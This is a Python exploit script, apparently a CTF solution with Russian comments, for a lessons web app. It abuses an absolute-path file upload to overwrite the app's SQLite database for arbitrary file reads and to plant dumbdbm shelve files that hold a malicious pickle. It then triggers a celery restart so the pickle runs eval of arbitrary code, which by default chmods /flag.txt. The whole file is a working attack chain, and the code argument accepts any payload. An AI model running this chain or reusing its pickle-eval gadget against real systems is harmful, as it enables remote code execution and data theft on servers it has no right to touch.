#!/usr/bin/env python3
"""Этап 2: RCE через pickle в shelve celery beat -> chmod /flag.txt -> чтение.

Цепочка:
1. Через arbitrary write (upload с абсолютным именем) заливаем dumbdbm-трио
   /data/celerybeat-schedule.{dir,dat,bak} с pickle-payload в ключе 'entries'.
2. Ломаем детект альтернативных форматов: затираем base-файл и .db мусором
   (whichdb: .pag+.dir -> .db+ndbm -> .dat+.dir(dumb) -> magic; наши файлы
   выигрывают, если нет .pag).
3. Перезаливаем evil.db (row1 -> /flag.txt).
4. POST /lesson -> ops.apply_schedule_changes -> supervisorctl restart celery
   -> beat открывает shelve -> pickle.loads -> eval("os.chmod('/flag.txt',0644) or {}")
5. GET /lesson/1/file -> флаг.

Usage:
  python3 uroki_stage2_rce.py probe http://HOST          # какие файлы есть
  python3 uroki_stage2_rce.py pwn   http://HOST [code]   # полный цикл
"""
import os
import pickle
import sqlite3
import sys
import tempfile
import time

import requests

BASE_DEFAULT = ""  # задай свой инстанс вторым аргументом

SCHEMA = """
CREATE TABLE IF NOT EXISTS lessons (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL, subject TEXT NOT NULL, teacher TEXT NOT NULL,
    scheduled_at INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'planned',
    homework TEXT, file_name TEXT, file_path TEXT, created_at INTEGER NOT NULL
);
CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT, lesson_id INTEGER NOT NULL,
    author TEXT NOT NULL, body TEXT NOT NULL, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_comments_lesson ON comments (lesson_id);
"""


def req(method: str, url: str, expect=(200, 302, 303), tries: int = 10, **kw):
    """Запрос с ретраями: прокси платформы флакает 400/пустыми ответами."""
    last = None
    for _ in range(tries):
        try:
            last = requests.request(method, url, timeout=25, **kw)
            if last.status_code in expect:
                return last
        except requests.RequestException:
            pass
        time.sleep(1.5)
    return last


def craft_db(target_file: str) -> bytes:
    fd, tmp = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    try:
        conn = sqlite3.connect(tmp)
        try:
            conn.executescript(SCHEMA)
            conn.execute(
                "INSERT INTO lessons (id,title,subject,teacher,scheduled_at,status,"
                "homework,file_name,file_path,created_at) VALUES"
                " (1,'flag','flag','flag',1799999999,'done',NULL,'flag.txt',?,0)",
                (target_file,),
            )
            conn.execute(
                "INSERT INTO lessons (id,title,subject,teacher,scheduled_at,status,"
                "homework,file_name,file_path,created_at) VALUES"
                " (2,'x','x','x',1799999999,'planned',NULL,NULL,NULL,0)"
            )
            conn.commit()
        finally:
            conn.close()
        with open(tmp, "rb") as f:
            return f.read()
    finally:
        os.unlink(tmp)


class Payload:
    def __init__(self, code):
        self.code = code

    def __reduce__(self):
        return (eval, (self.code,))


def upload(base: str, s: requests.Session, remote_path: str, data: bytes) -> int:
    """Upload с ретраями: прокси платформы иногда отдаёт 400 (флак)."""
    r = req("POST", f"{base}/lesson/2/upload",
            files={"file": (remote_path, data)}, allow_redirects=False)
    return r.status_code if r else 0


def read_via_db(base: str, s: requests.Session, path: str):
    """Заливает evil.db с file_path=path и читает /lesson/1/file."""
    st = upload(base, s, "/data/uroki.db", craft_db(path))
    assert st in (200, 302, 303), f"upload failed: {st}"
    # 400-ки прокси ретраим до честного ответа приложения (200/500)
    r = req("GET", f"{base}/lesson/1/file", expect=(200, 500), tries=8)
    return r


def probe(base: str) -> None:
    s = requests.Session()
    # уроки должны существовать для upload-эндпоинта
    rows = req("GET", f"{base}/api/lessons.json").json()
    ids = [r["id"] for r in rows]
    while len(ids) < 2:
        req("POST", f"{base}/lesson", data=dict(title="hw", subject="m", teacher="t",
            date="2026-12-20", time="10:00"), allow_redirects=False)
        ids = [r["id"] for r in req("GET", f"{base}/api/lessons.json").json()]
    for path in [
        "/data/celerybeat-schedule",
        "/data/celerybeat-schedule.db",
        "/data/celerybeat-schedule.pag",
        "/data/celerybeat-schedule.dir",
        "/data/celerybeat-schedule.dat",
        "/data/celerybeat-schedule.bak",
        "/flag.txt",
    ]:
        r = read_via_db(base, s, path)
        size = len(r.content) if r.status_code == 200 else 0
        status = "EXISTS" if r.status_code == 200 else f"HTTP {r.status_code}"
        print(f"  {path:40s} -> {status} ({size} bytes)")


def pwn(base: str, code: str) -> None:
    s = requests.Session()
    rows = req("GET", f"{base}/api/lessons.json").json()
    titles = {r["id"]: r["title"] for r in rows}
    print(f"[*] current db rows: {titles}")
    if 1 not in titles or 2 not in titles:
        print("[!] нет уроков 1/2 — создаю")
        for _ in range(2):
            req("POST", f"{base}/lesson", data=dict(title="hw", subject="m",
                teacher="t", date="2026-12-20", time="10:00"), allow_redirects=False)
        rows = req("GET", f"{base}/api/lessons.json").json()
        print(f"[*] rows now: {{r['id'] for r in rows}}")

    # 1. dumbdbm-трио с payload
    data = pickle.dumps(Payload(code), protocol=2)
    index = ("'entries', (0, %d)\n" % len(data)).encode()
    for name, blob in [
        ("/data/celerybeat-schedule.dir", index),
        ("/data/celerybeat-schedule.dat", data),
        ("/data/celerybeat-schedule.bak", data),
    ]:
        code_st = upload(base, s, name, blob)
        print(f"[*] upload {name} -> {code_st}")

    # 2. ломаем детект ndbm(.db) и gdbm(magic) — мусор
    for name in ["/data/celerybeat-schedule", "/data/celerybeat-schedule.db"]:
        code_st = upload(base, s, name, b"x")
        print(f"[*] upload {name} (garbage) -> {code_st}")

    # 3. возвращаем evil.db с указателем на /flag.txt
    assert upload(base, s, "/data/uroki.db", craft_db("/flag.txt")) in (200, 302, 303)
    print("[*] evil.db restored (row1 -> /flag.txt)")

    # 4. триггерим рестарт celery
    r = req("POST", f"{base}/lesson", data=dict(title="ring", subject="bell",
            teacher="t", date="2026-12-21", time="10:00"), allow_redirects=False)
    print(f"[*] lesson created (restart trigger) -> {r.status_code if r else 'FAIL'}")

    # 5. ждём рестарт и читаем флаг; каждые 3 попытки дёргаем рестарт ещё раз
    for attempt in range(1, 9):
        if attempt in (3, 6):
            r = req("POST", f"{base}/lesson", data=dict(
                title=f"ring{attempt}", subject="bell", teacher="t",
                date="2026-12-22", time="10:00"), allow_redirects=False)
            print(f"[*] re-trigger restart -> {r.status_code if r else 'FAIL'}")
        time.sleep(4)
        r = req("GET", f"{base}/lesson/1/file", tries=4)
        print(f"[*] attempt {attempt}: GET /lesson/1/file -> {r.status_code if r else 'FAIL'}")
        if r is not None and r.status_code == 200:
            print("\n[+] CONTENT:\n" + r.text.strip())
            return
    print("[-] flag not readable yet; читай /data/worker.err.log через read-примитив")


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "pwn"
    base = sys.argv[2].rstrip("/") if len(sys.argv) > 2 else BASE_DEFAULT
    if mode == "probe":
        probe(base)
    else:
        code = sys.argv[3] if len(sys.argv) > 3 else \
            "__import__('os').chmod('/flag.txt', 0o644) or {}"
        pwn(base, code)
